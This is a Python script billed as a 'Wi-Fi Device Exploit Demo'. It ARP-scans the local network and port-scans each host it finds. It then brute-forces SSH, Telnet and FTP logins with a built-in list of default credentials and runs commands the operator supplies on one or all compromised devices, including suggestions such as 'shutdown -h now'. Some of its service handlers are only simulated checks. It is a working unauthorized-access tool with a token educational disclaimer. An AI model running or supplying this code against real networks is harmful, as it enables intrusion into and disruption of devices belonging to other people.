import socket
import threading
import time
import logging
import sys
from scapy.all import ARP, Ether, srp
import ipaddress
import netifaces
import concurrent.futures

# Optional imports with error handling
try:
    import paramiko
except ImportError:
    paramiko = None
    logging.warning("paramiko not installed. SSH control will be disabled. Install with: pip3 install paramiko")

try:
    import telnetlib
except ImportError:
    telnetlib = None
    logging.warning("telnetlib not found. Telnet control will be disabled.")

try:
    import requests
except ImportError:
    requests = None
    logging.warning("requests not installed. HTTP control will be disabled. Install with: pip3 install requests")

try:
    import ftplib
except ImportError:
    ftplib = None
    logging.warning("ftplib not found. FTP control will be disabled.")

# Configuration
PORT_SCAN_RANGE = [21, 22, 23, 80, 445, 3389, 8080, 3306]  # FTP, SSH, Telnet, HTTP, SMB, RDP, HTTP-Alt, MySQL
TIMEOUT = 2
DEFAULT_CREDS = [
    ("root", "toor"), ("admin", "admin"), ("guest", ""),
    ("user", "password"), ("Administrator", ""), ("ftp", "ftp"),
    ("mysql", ""), ("pi", "raspberry")  # Common for Raspberry Pi and MySQL
]
THREAD_POOL_SIZE = 50

# Device storage
connected_devices = {}
lock = threading.Lock()

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Get local network info
def get_local_network():
    try:
        interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        addrs = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]
        ip = addrs['addr']
        netmask = addrs['netmask']
        network = ipaddress.ip_network(f"{ip}/{netmask}", strict=False)
        return network, interface
    except Exception as e:
        logging.error(f"Error getting network: {e}")
        return ipaddress.ip_network("192.168.1.0/24", strict=False), "eth0"

LOCAL_NETWORK, INTERFACE = get_local_network()

# Scan network for devices
def scan_network():
    try:
        arp = ARP(pdst=str(LOCAL_NETWORK))
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=TIMEOUT, iface=INTERFACE, verbose=False)[0]
        return [{"ip": r.psrc, "mac": r.hwsrc, "name": "Unknown"} for s, r in result]
    except Exception as e:
        logging.error(f"Network scan failed: {e}")
        return []

# Port scanning with threading
def scan_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    try:
        result = sock.connect_ex((ip, port))
        return port if result == 0 else None
    except:
        return None
    finally:
        sock.close()

def scan_ports(ip):
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_POOL_SIZE) as executor:
        future_to_port = {executor.submit(scan_port, ip, port): port for port in PORT_SCAN_RANGE}
        for future in concurrent.futures.as_completed(future_to_port):
            port = future.result()
            if port:
                open_ports.append(port)
    return open_ports

# Exploitation methods
def ssh_control(ip, command):
    if not paramiko:
        return "SSH Disabled: paramiko not installed"
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for username, password in DEFAULT_CREDS:
        try:
            ssh.connect(ip, username=username, password=password, timeout=5)
            stdin, stdout, stderr = ssh.exec_command(command, timeout=10)
            output = stdout.read().decode('utf-8') or stderr.read().decode('utf-8')
            ssh.close()
            return f"SSH Success ({username}:{password}): {output}"
        except Exception as e:
            continue
    return "SSH Failed: No valid credentials"

def telnet_control(ip, command):
    if not telnetlib:
        return "Telnet Disabled: telnetlib not installed"
    for username, password in DEFAULT_CREDS:
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=5)
            if username:
                tn.read_until(b"login: ", timeout=3)
                tn.write(username.encode('ascii') + b"\n")
            if password:
                tn.read_until(b"Password: ", timeout=3)
                tn.write(password.encode('ascii') + b"\n")
            tn.write(command.encode('ascii') + b"\n")
            tn.write(b"exit\n")
            output = tn.read_all().decode('ascii', errors='ignore')
            tn.close()
            return f"Telnet Success ({username}:{password}): {output}"
        except Exception as e:
            continue
    return "Telnet Failed: No valid credentials"

def ftp_control(ip, command):
    if not ftplib:
        return "FTP Disabled: ftplib not installed"
    for username, password in DEFAULT_CREDS:
        try:
            ftp = ftplib.FTP(ip, timeout=5)
            ftp.login(username, password)
            if command.lower() == "list":
                output = "\n".join(ftp.nlst())
            else:
                output = "FTP command not supported in this demo"
            ftp.quit()
            return f"FTP Success ({username}:{password}): {output}"
        except Exception as e:
            continue
    return "FTP Failed: No valid credentials"

def http_control(ip, command):
    if not requests:
        return "HTTP Disabled: requests not installed"
    try:
        url = f"http://{ip}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return f"HTTP Success: Web interface accessible (Status: {response.status_code})"
        return "HTTP Failed: No vulnerable web interface"
    except Exception as e:
        return f"HTTP Failed: {str(e)}"

def smb_control(ip, command):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, 445))
        sock.close()
        return f"SMB Success: Connected (command simulation: {command})"
    except:
        return "SMB Failed: No connection"

def rdp_control(ip, command):
    return "RDP Control: Requires external tools (e.g., xfreerdp) for real exploitation"

def mysql_control(ip, command):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, 3306))
        sock.close()
        return f"MySQL Success: Connected (command simulation: {command})"
    except:
        return "MySQL Failed: No connection"

# Update devices
def update_devices():
    global connected_devices
    while True:
        devices = scan_network()
        with lock:
            connected_devices.clear()
            for i, device in enumerate(devices, 1):
                open_ports = scan_ports(device["ip"])
                connected_devices[i] = {
                    "ip": device["ip"],
                    "mac": device["mac"],
                    "name": device["name"],
                    "ports": open_ports,
                    "last_seen": time.time()
                }
        time.sleep(10)

# Command handler
def command_handler():
    while True:
        try:
            print("\nDevices on Wi-Fi (Sorted by ID):")
            with lock:
                sorted_devices = dict(sorted(connected_devices.items()))
                if not sorted_devices:
                    print("No devices detected. Ensure Wi-Fi connection and root privileges.")
                for device_id, info in sorted_devices.items():
                    ports_str = f"Open Ports: {info['ports']}" if info['ports'] else "No open ports"
                    print(f"{device_id}: {info['name']} - IP: {info['ip']} - MAC: {info['mac']} "
                          f"- {ports_str} - Last seen: {time.ctime(info['last_seen'])}")

            user_input = input("Enter device ID ('--all' for all, 'exit' to quit): ").strip()
            
            if user_input == "exit":
                break
                
            elif user_input == "--all":
                command = input("Enter command ('back' to return): ").strip()
                if command == "back":
                    continue
                if command:
                    with lock:
                        for device_id, info in sorted_devices.items():
                            response = execute_command(info, command)
                            print(f"Device {device_id} ({info['ip']}): {response}")
                            
            elif user_input.isdigit() and int(user_input) in connected_devices:
                device_id = int(user_input)
                command = input(f"Enter command for Device {device_id} ('back' to return): ").strip()
                if command == "back":
                    continue
                if command:
                    with lock:
                        if device_id in connected_devices:
                            response = execute_command(connected_devices[device_id], command)
                            print(f"Device {device_id} ({connected_devices[device_id]['ip']}): {response}")
            else:
                print("Invalid input. Use device ID, '--all', or 'exit'.")
                
        except KeyboardInterrupt:
            print("\nShutting down...")
            break
        except Exception as e:
            logging.error(f"Command handler error: {e}")
            print("Error occurred. Check logs.")

def execute_command(device_info, command):
    ip = device_info["ip"]
    ports = device_info["ports"]
    if 22 in ports:
        return ssh_control(ip, command)
    elif 23 in ports:
        return telnet_control(ip, command)
    elif 21 in ports:
        return ftp_control(ip, command)
    elif 80 in ports or 8080 in ports:
        return http_control(ip, command)
    elif 445 in ports:
        return smb_control(ip, command)
    elif 3389 in ports:
        return rdp_control(ip, command)
    elif 3306 in ports:
        return mysql_control(ip, command)
    else:
        return "No exploitable ports open"

# Help message
def show_help():
    print("""
Wi-Fi Device Exploit Demo - Usage Guide
--------------------------------------
Run with: sudo python3 script.py [-h]

Options:
  -h    Show this help message

Interactive Commands:
  <ID>        Control a specific device
  --all       Control all devices with open ports
  exit        Quit the program
  back        Return to device selection

Supported Exploits:
  21 (FTP): 'list' to show files
  22 (SSH): Any command (e.g., 'whoami', 'shutdown -h now')
  23 (Telnet): Any command
  80/8080 (HTTP): Check web interface
  445 (SMB): Simulate share access
  3389 (RDP): Simulated check
  3306 (MySQL): Simulate DB access

Install dependencies:
  sudo apt install python3-scapy python3-paramiko
  pip3 install requests

Warning: For educational use only on your own network!
""")
    sys.exit(0)

def main():
    if "-h" in sys.argv:
        show_help()
    
    scan_thread = threading.Thread(target=update_devices, daemon=True)
    scan_thread.start()
    time.sleep(3)
    command_handler()

if __name__ == "__main__":
    main()
